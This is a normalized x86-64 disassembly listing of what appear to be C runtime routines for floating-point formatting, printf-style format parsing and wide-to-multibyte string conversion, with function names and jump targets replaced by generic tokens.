mov [ rdx ] al
mov rax [ rsp + 0x30 ]
inc rdx
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ rdx ] cl
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
lea rcx [ rbx + 0x2 ]
test r15d r15d
je r-xdata
mov rax [ rsi + 0x10 ]
cmp [ rax ] 0x30
je r-xdata
mov [ rbx ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov r8d [ rsi + 0x4 ]
dec r8d
jns r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp [ rcx ] 0x30
jne r-xdata
cmp r8d 0x64
jl r-xdata
neg r8d
mov [ rbx + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
lea rdx [ rcx + 0x1 ]
mov r8d 0x3
call sub_14003a8c0
cmp r8d 0xa
jl r-xdata
mov eax 0x51eb851f
imul r8d
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
add [ rbx + 0x2 ] dl
imul edx edx 0xffffff9c
add r8d edx
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r13
pop r12
retn
add [ rbx + 0x4 ] r8b
mov eax 0x66666667
imul r8d
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
add [ rbx + 0x3 ] dl
imul edx edx 0xfffffff6
add r8d edx
sub_14004c3fc
push rbx
push rbp
push rsi
push rdi
sub rsp 0x88
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rcx [ rcx ]
mov rbx r8
mov rdi rdx
mov esi r9d
mov ebp 0x16
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x40 ]
mov r9d ebp
call sub_140051e6c
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_14003f1a4
mov [ rax ] ebp
call sub_140043760
mov eax ebp
jmp r-xdata
or rdx 0xffffffffffffffff
cmp rbx rdx
je r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x88
pop rdi
pop rsi
pop rbp
pop rbx
retn
xor eax eax
cmp [ rsp + 0x40 ] 0x2d
lea r8d [ rsi + 0x1 ]
sete al
xor ecx ecx
test esi esi
setg cl
add rax rdi
lea r9 [ rsp + 0x40 ]
add rcx rax
call sub_140051cd8
test eax eax
je r-xdata
xor eax eax
cmp [ rsp + 0x40 ] 0x2d
mov rdx rbx
sete al
sub rdx rax
xor eax eax
test esi esi
setg al
sub rdx rax
mov rax [ rsp + 0xd8 ]
mov r9d [ rsp + 0xd0 ]
mov r8d esi
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call sub_14004c1c8
mov [ rdi ] 0x0
jmp r-xdata
sub_14004c4f4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x50
mov rdi rdx
mov rdx [ rbp + 0x58 ]
mov r14 rcx
lea rcx [ rbp - 0x20 ]
mov r12d r9d
mov rbx r8
mov [ rbp + 0x30 ] 0x3ff
mov r13d 0x30
call sub_14003b928
xor r15d r15d
test r12d r12d
cmovs r12d r15d
test rdi rdi
jne r-xdata
test rbx rbx
jne r-xdata
call sub_14003f1a4
lea ebx [ rdi + 0x16 ]
lea eax [ r12 + 0xb ]
mov [ rdi ] r15b
movsxd rcx eax
cmp rbx rcx
ja r-xdata
call sub_14003f1a4
mov ebx 0x16
mov [ rax ] ebx
call sub_140043760
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rax [ r14 ]
mov ecx 0x7ff
shr rax 0x34
and rax rcx
cmp rax rcx
jne r-xdata
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rax 0x8000000000000000
test [ r14 ] rax
je r-xdata
lea r8 [ rbx - 0x2 ]
cmp rbx 0xffffffffffffffff
lea rdx [ rdi + 0x2 ]
mov r9d r12d
mov rcx r14
cmove r8 rbx
mov [ rsp + 0x28 ] r15
mov [ rsp + 0x20 ] r15d
call sub_14004c3fc
test eax eax
je r-xdata
mov [ rax ] ebx
call sub_140043760
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov r9d [ rbp + 0x50 ]
mov r11d 0x30
mov rbx 0xfffffffffffff
mov eax r9d
mov [ rdi ] r11b
neg eax
mov eax r9d
sbb cl cl
and cl 0xe0
add cl 0x78
neg eax
mov rax 0x7ff0000000000000
sbb edx edx
mov [ rdi + 0x1 ] cl
and edx 0xffffffe0
sub edx 0xffffffd9
test [ r14 ] rax
jne r-xdata
mov [ rdi ] 0x2d
inc rdi
cmp [ rdi + 0x2 ] 0x2d
jne r-xdata
mov [ rdi ] r15b
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov [ rdi + 0x2 ] 0x31
add rdi 0x3
mov [ rdi + 0x2 ] r11b
mov rax [ r14 ]
add rdi 0x3
and rax rbx
neg rax
sbb rax rax
and eax 0x3fe
mov [ rbp + 0x30 ] rax
jmp r-xdata
mov ebx [ rbp + 0x50 ]
mov [ rdi ] 0x30
mov edx 0x65
mov eax ebx
neg eax
sbb cl cl
and cl 0xe0
add cl 0x78
mov [ rdi + 0x1 ] cl
lea rcx [ rdi + 0x2 ]
call sub_140051ab0
test rax rax
je r-xdata
mov [ rdi ] 0x2d
inc rdi
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ r15 ] cl
mov [ r15 ] r10b
jmp r-xdata
mov r15 rdi
xor r10d r10d
inc rdi
test r12d r12d
jne r-xdata
cmp [ rbp - 0x8 ] r15b
jmp r-xdata
neg ebx
sbb cl cl
and cl 0xe0
add cl 0x70
mov [ rax ] cl
mov [ rax + 0x3 ] r15b
test r12d r12d
jle r-xdata
mov r8 0xf000000000000
test [ r14 ] rbx
jbe r-xdata
je r-xdata
cmp [ r15 ] r10b
cmove rdi r15
neg r9d
sbb al al
and al 0xe0
add al 0x70
mov [ rdi ] al
mov rcx [ r14 ]
shr rcx 0x34
and ecx 0x7ff
sub rcx [ rbp + 0x30 ]
js r-xdata
mov r8d r12d
mov dl r11b
mov rcx rdi
mov ebx r12d
call sub_14003d760
mov r9d [ rbp + 0x50 ]
add rdi rbx
xor r10d r10d
lea r11d [ r10 + 0x30 ]
test r13w r13w
js r-xdata
mov rax [ r14 ]
mov cl r13b
and rax r8
and rax rbx
shr rax cl
add ax r11w
cmp ax 0x39
jbe r-xdata
xor eax eax
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov [ rdi + 0x1 ] 0x2d
add rdi 0x2
neg rcx
mov [ rdi + 0x1 ] 0x2b
add rdi 0x2
jmp r-xdata
mov rax [ r14 ]
mov cl r13b
and rax r8
and rax rbx
shr rax cl
cmp ax 0x8
jbe r-xdata
mov [ rdi ] al
shr r8 0x4
dec r12d
inc rdi
add r13w 0xfffc
jns r-xdata
add ax dx
cmp rcx 0x64
jl r-xdata
mov rax 0x20c49ba5e353f7cf
imul rcx
sar rdx 0x7
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xfffffffffffffc18
mov [ rdi ] al
inc rdi
add rcx rdx
cmp rdi r8
jne r-xdata
mov r8 rdi
mov [ rdi ] r11b
cmp rcx 0x3e8
jl r-xdata
lea rax [ rdi - 0x1 ]
test r12d r12d
jle r-xdata
cmp rdi r8
jne r-xdata
mov rax 0xa3d70a3d70a3d70b
imul rcx
add rdx rcx
sar rdx 0x6
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xffffffffffffff9c
mov [ rdi ] al
inc rdi
add rcx rdx
mov [ rax ] r11b
dec rax
jmp r-xdata
cmp [ rax ] 0x46
jne r-xdata
mov rax 0x6666666666666667
imul rcx
sar rdx 0x2
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xfffffffffffffff6
mov [ rdi ] al
inc rdi
add rcx rdx
cmp rcx 0xa
jl r-xdata
cmp [ rax ] 0x66
je r-xdata
cmp rax r15
je r-xdata
add cl r11b
cmp [ rbp - 0x8 ] r10b
mov [ rdi ] cl
mov [ rdi + 0x1 ] r10b
inc [ rax - 0x1 ]
mov cl [ rax ]
cmp cl 0x39
jne r-xdata
inc cl
mov [ rax ] cl
jmp r-xdata
add dl 0x3a
mov [ rax ] dl
jmp r-xdata
sub_14004c8d4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
mov ebx [ r9 + 0x4 ]
mov rsi rdx
mov rdx [ rsp + 0x78 ]
mov rdi rcx
lea rcx [ rax - 0x28 ]
mov r12 r9
dec ebx
mov ebp r8d
call sub_14003b928
test rdi rdi
jne r-xdata
test rsi rsi
jne r-xdata
call sub_14003f1a4
lea ebx [ rdi + 0x16 ]
mov [ rax ] ebx
call sub_140043760
cmp [ rsp + 0x38 ] dil
je r-xdata
cmp [ rsp + 0x70 ] 0x0
je r-xdata
call sub_14003f1a4
lea ebx [ rsi + 0x16 ]
mov [ rax ] ebx
call sub_140043760
cmp [ rsp + 0x38 ] sil
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ r12 ] 0x2d
jne r-xdata
cmp ebx ebp
jne r-xdata
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
cmp [ r12 + 0x4 ] 0x0
jg r-xdata
mov [ rdi ] 0x2d
inc rdi
xor eax eax
cmp [ r12 ] 0x2d
movsxd rcx ebx
sete al
add rax rdi
mov [ rcx + rax ] 0x30
movsxd rax [ r12 + 0x4 ]
add rdi rax
mov rcx rdi
call sub_14003f7f0
lea rcx [ rdi + 0x1 ]
mov rdx rdi
lea r8 [ rax + 0x1 ]
call sub_14003a8c0
mov [ rdi ] 0x30
inc rdi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rcx rdi
lea rsi [ rdi + 0x1 ]
call sub_14003f7f0
mov rdx rdi
mov rcx rsi
lea r8 [ rax + 0x1 ]
call sub_14003a8c0
mov r11 [ rsp + 0x20 ]
mov rax [ r11 + 0x128 ]
mov rcx [ rax ]
mov al [ rcx ]
mov [ rdi ] al
mov ebx [ r12 + 0x4 ]
test ebx ebx
jns r-xdata
test ebp ebp
jle r-xdata
xor eax eax
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
neg ebx
cmp [ rsp + 0x70 ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov ebx ebp
cmp ebp eax
cmovge ebx eax
movsxd r8 ebx
mov edx 0x30
mov rcx rsi
call sub_14003d760
mov rcx rsi
call sub_14003f7f0
movsxd rcx ebx
mov rdx rsi
lea r8 [ rax + 0x1 ]
add rcx rsi
call sub_14003a8c0
sub_14004ca70
push rbx
push rbp
push rsi
push rdi
sub rsp 0x78
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rcx [ rcx ]
mov rbx r8
mov rdi rdx
mov esi r9d
mov ebp 0x16
lea r8 [ rsp + 0x48 ]
lea rdx [ rsp + 0x30 ]
mov r9d ebp
call sub_140051e6c
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_14003f1a4
mov [ rax ] ebp
call sub_140043760
mov eax ebp
jmp r-xdata
or rdx 0xffffffffffffffff
cmp rbx rdx
je r-xdata
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x78
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov r8d [ rsp + 0x34 ]
xor ecx ecx
lea r9 [ rsp + 0x30 ]
add r8d esi
cmp [ rsp + 0x30 ] 0x2d
sete cl
add rcx rdi
call sub_140051cd8
test eax eax
je r-xdata
xor eax eax
cmp [ rsp + 0x30 ] 0x2d
mov rdx rbx
sete al
sub rdx rax
mov rax [ rsp + 0xc0 ]
lea r9 [ rsp + 0x30 ]
mov r8d esi
mov [ rsp + 0x28 ] rax
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x20 ] 0x0
call sub_14004c8d4
mov [ rdi ] 0x0
jmp r-xdata
sub_14004cb44
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rcx [ rcx ]
mov rdi r8
mov rsi rdx
mov ebp r9d
mov ebx 0x16
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x40 ]
mov r9d ebx
call sub_140051e6c
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_14003f1a4
mov [ rax ] ebx
call sub_140043760
mov eax ebx
jmp r-xdata
mov r12d [ rsp + 0x44 ]
xor eax eax
dec r12d
cmp [ rsp + 0x40 ] 0x2d
sete al
or rdx 0xffffffffffffffff
lea rbx [ rax + rsi ]
cmp rdi rdx
je r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x80
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov rcx rbx
call sub_140051cd8
test eax eax
je r-xdata
mov rdx rdi
sub rdx rax
mov eax [ rsp + 0x44 ]
dec eax
cmp r12d eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ rsi ] 0x0
jmp r-xdata
mov rax [ rsp + 0xd8 ]
mov r9d [ rsp + 0xd0 ]
mov r8d ebp
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] rax
call sub_14004c1c8
cmp eax ebp
jge r-xdata
test cl cl
je r-xdata
mov rax [ rsp + 0xd8 ]
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov [ rsp + 0x28 ] rax
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] 0x1
call sub_14004c8d4
jmp r-xdata
mov al [ rbx ]
inc rbx
test al al
jne r-xdata
mov [ rbx - 0x2 ] al
sub_14004cc78
sub rsp 0x38
cmp r9d 0x65
je r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_14004c3fc
cmp r9d 0x45
je r-xdata
cmp r9d 0x66
jne r-xdata
cmp r9d 0x61
je r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_14004ca70
jmp r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_14004c4f4
jmp r-xdata
cmp r9d 0x41
je r-xdata
add rsp 0x38
retn
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_14004cb44
jmp r-xdata
sub_14004cd34
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call [ EncodePointer@IAT ]
mov [ rbx ] rax
add rbx 0x8
dec rdi
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_14004cd6c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x60
mov rsi rcx
mov rdi rdx
lea rcx [ rbp - 0x20 ]
mov rdx r9
mov r12 r9
mov rbx r8
call sub_14003b928
test rbx rbx
jne r-xdata
test rsi rsi
jne r-xdata
cmp [ rbp - 0x8 ] bl
je r-xdata
test rdi rdi
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp rbx 0x7fffffff
ja r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x18 ]
cmp [ rcx + 0x8 ] 0x0
jne r-xdata
mov eax [ rcx + 0x4 ]
mov edx [ rcx + 0xc ]
lea rcx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] ebx
mov r9 rsi
mov r8d 0x1001
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] ebx
call sub_140052274
test eax eax
je r-xdata
mov r9 r12
mov r8 rbx
mov rdx rdi
mov rcx rsi
call sub_140052300
jmp r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
add eax 0xfffffffe
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_14004ce78
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x40
and [ rsp + 0x50 ] 0x0
mov rbx [ rw-data ]
mov rax [ rbx ]
test rax rax
je r-xdata
xor eax eax
or ebp 0xffffffff
mov eax ebp
jmp r-xdata
mov rcx rdi
mov edx 0x1
call sub_140041704
mov [ rsp + 0x50 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov r8 [ rbx ]
mov r9d ebp
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x50 ]
call sub_14003ad04
lea rcx [ rsp + 0x50 ]
xor edx edx
call sub_140052404
test eax eax
jns r-xdata
add rbx 0x8
mov rax [ rbx ]
test rax rax
jne r-xdata
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
mov r9d ebp
mov r8 rax
xor edx edx
xor ecx ecx
call [ WideCharToMultiByte@IAT ]
movsxd rdi eax
test eax eax
je r-xdata
call sub_14003ad04
and [ rsp + 0x50 ] 0x0
sub_14004cf88
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
call sub_140041e90
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
inc [ rbx ]
or [ rbx ] 0xffffffff
jmp r-xdata
inc [ r8 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_14004cfc0
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
movzx ebp cx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
movzx ecx bp
dec ebx
call sub_14004cf88
cmp [ rdi ] 0xffffffff
je r-xdata
sub_14004d014
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
test [ r8 + 0x18 ] 0x40
mov rbx [ rsp + 0x60 ]
mov rdi r9
mov r12d [ rbx ]
mov rbp r8
mov esi edx
mov r13 rcx
je r-xdata
and [ rbx ] 0x0
test edx edx
jle r-xdata
cmp [ r8 + 0x10 ] 0x0
jne r-xdata
mov [ rbx ] r12d
movzx ecx [ r13 ]
mov r8 rdi
mov rdx rbp
dec esi
call sub_14004cf88
add r13 0x2
cmp [ rdi ] 0xffffffff
jne r-xdata
add [ r9 ] edx
jmp r-xdata
test esi esi
jg r-xdata
cmp [ rbx ] 0x2a
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
cmp [ rbx ] 0x0
jne r-xdata
mov ecx 0x3f
mov r8 rdi
mov rdx rbp
call sub_14004cf88
sub_14004d0b0
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x3e0 ]
sub rsp 0x4e0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x3d0 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x78 ] rcx
mov [ rbp - 0x80 ] rdx
lea rcx [ rbp - 0x70 ]
mov rdx r8
mov r14 r9
mov [ rsp + 0x50 ] r9
mov [ rsp + 0x74 ] eax
mov r12d eax
mov [ rsp + 0x5c ] eax
mov edi eax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x70 ] eax
mov [ rsp + 0x58 ] eax
call sub_14003b928
call sub_14003f1a4
xor r10d r10d
mov [ rbp - 0x48 ] rax
test rbx rbx
jne r-xdata
mov r8 [ rbp - 0x80 ]
test r8 r8
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor r11d r11d
cmp [ rbp - 0x58 ] r11b
je r-xdata
movzx r13d [ r8 ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov r15d r10d
mov edx r10d
mov [ rbp - 0x50 ] r10
test r13w r13w
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x58 ] r10b
je r-xdata
mov rbx [ rbp - 0x48 ]
mov ecx 0x58
mov r9d 0x200
lea r11d [ rcx - 0x38 ]
mov rcx [ rbp + 0x3d0 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x530 ]
add rsp 0x4e0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax esi
mov rcx [ rbp - 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx eax r13w
sub ax r11w
cmp ax cx
ja r-xdata
mov ecx r10d
lea rcx [ r--data ]
movzx eax r13w
movsx ecx [ rax + rcx - 0x20 ]
and ecx 0xf
jmp r-xdata
mov rdx [ rsp + 0x78 ]
lea r8 [ rsp + 0x40 ]
movzx ecx r13w
mov [ rsp + 0x58 ] 0x1
call sub_14004cf88
mov esi [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
dec ecx
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
lea rax [ r--data ]
movsx edx [ rdx + rax ]
sar edx 0x4
mov [ rsp + 0x6c ] edx
mov ecx edx
test edx edx
je r-xdata
mov r11d 0x20
jmp r-xdata
or edi 0xffffffff
mov [ rbp - 0x78 ] r10d
mov [ rsp + 0x70 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x48 ] r10d
mov r12d r10d
mov [ rsp + 0x44 ] edi
mov [ rsp + 0x58 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov edx [ rsp + 0x6c ]
mov r8 [ rbp - 0x80 ]
mov r9d 0x200
mov ecx 0x58
movzx eax r13w
cmp eax r11d
je r-xdata
dec ecx
je r-xdata
add r8 0x2
mov [ rbp - 0x80 ] r8
test esi esi
js r-xdata
or r12d 0x2
jmp r-xdata
cmp eax 0x23
je r-xdata
cmp r13w 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r12d 0x7
jmp r-xdata
mov ecx 0x2b
cmp eax ecx
je r-xdata
mov eax [ rsp + 0x5c ]
lea ecx [ rax + rax * 4 ]
movzx eax r13w
lea eax [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x5c ] eax
jmp r-xdata
mov eax [ r14 ]
add r14 0x8
mov ecx 0x58
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x5c ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r12d 0x1
jmp r-xdata
mov ecx 0x2d
cmp eax ecx
je r-xdata
movzx r13d [ r8 ]
test r13w r13w
jne r-xdata
or r12d 0x4
neg eax
mov [ rsp + 0x5c ] eax
jmp r-xdata
cmp r13w 0x2a
jne r-xdata
dec ecx
je r-xdata
or r12d 0x4
jmp r-xdata
mov ecx 0x30
cmp eax ecx
mov ecx 0x58
jne r-xdata
lea ecx [ rdi + rdi * 4 ]
movzx eax r13w
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x44 ] edi
jmp r-xdata
mov edi [ r14 ]
add r14 0x8
mov ecx 0x58
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x44 ] edi
test edi edi
jns r-xdata
movzx eax r13w
cmp eax 0x49
je r-xdata
dec ecx
jne r-xdata
or r12d 0x8
jmp r-xdata
or edi 0xffffffff
mov [ rsp + 0x44 ] edi
jmp r-xdata
bts r12d 0xf
cmp [ r8 ] 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
movzx eax r13w
mov ecx 0x64
cmp eax ecx
jg r-xdata
cmp [ r8 ] 0x33
jne r-xdata
cmp [ r8 + 0x2 ] 0x34
jne r-xdata
or r12d r11d
jmp r-xdata
mov ecx 0x6c
cmp eax ecx
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
mov eax 0x64
cmp [ r8 ] ax
je r-xdata
cmp [ r8 + 0x2 ] 0x32
jne r-xdata
add r8 0x4
bts r12d 0xf
jmp r-xdata
cmp [ r8 ] cx
mov ecx 0x58
jne r-xdata
mov ecx 0x58
cmp eax 0x77
jne r-xdata
mov edi 0x2d
mov ecx 0x67
cmp eax ecx
jle r-xdata
or r12d 0x40
cmp eax 0x41
je r-xdata
mov eax 0x69
cmp [ r8 ] ax
je r-xdata
add r8 0x4
btr r12d 0xf
jmp r-xdata
or r12d 0x10
jmp r-xdata
add r8 0x2
bts r12d 0xc
jmp r-xdata
bts r12d 0xb
jmp r-xdata
mov r11d 0x20
test r12b 0x40
je r-xdata
or r12d 0x40
lea rbx [ rbp - 0x30 ]
mov esi r9d
test edi edi
jns r-xdata
mov ecx 0x69
cmp eax ecx
je r-xdata
bt r12d 0xc
jb r-xdata
mov r8 [ r14 ]
add r14 0x8
jmp r-xdata
mov [ rbp - 0x78 ] 0x1
add r13w r11w
cmp eax 0x43
je r-xdata
mov eax 0x6f
cmp [ r8 ] ax
je r-xdata
mov edi [ rsp + 0x44 ]
mov rcx rax
call sub_14003ad04
mov edi [ rsp + 0x44 ]
xor r10d r10d
mov [ rbp - 0x50 ] r10
mov edi [ rsp + 0x48 ]
bt r12d 0x8
jae r-xdata
jne r-xdata
mov r15d 0x6
cmp eax 0x6e
je r-xdata
add r14 0x8
test r11b r12b
je r-xdata
mov [ rsp + 0x50 ] r14
test r12d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
mov eax 0x75
lea ecx [ rax - 0x1d ]
cmp [ r8 ] ax
je r-xdata
mov rsi [ rbp - 0x48 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov r8 r13
mov edx edi
mov [ rsp + 0x20 ] rsi
call sub_14004d014
test r12b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx eax
mov r8 r13
mov edx r14d
call sub_14004cfc0
test r12b 0x1
je r-xdata
mov [ rsp + 0x60 ] di
cmp edi r9d
mov r15d 0xa3
cmovg edi r9d
mov [ rsp + 0x44 ] edi
cmp edi r15d
jle r-xdata
cmp r13w cx
jne r-xdata
mov rax [ r14 ]
mov rcx [ rw-data ]
add r14 0x8
mov [ rsp + 0x50 ] r14
movsx edi r13b
movsxd rsi esi
mov [ rbp - 0x40 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x70 ]
mov [ rsp + 0x30 ] rcx
mov ecx [ rbp - 0x78 ]
mov r9d edi
mov [ rsp + 0x28 ] ecx
